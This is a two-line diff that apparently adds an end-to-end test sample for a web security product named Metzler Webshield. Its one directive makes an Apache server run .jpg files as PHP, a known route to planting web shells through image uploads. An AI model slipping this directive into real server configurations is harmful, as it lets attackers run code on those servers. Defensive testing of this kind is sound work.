@@ -1,0 +1,2 @@
+# Metzler Webshield e2e sample: makes the server execute images as PHP
+AddType application/x-httpd-php .jpg
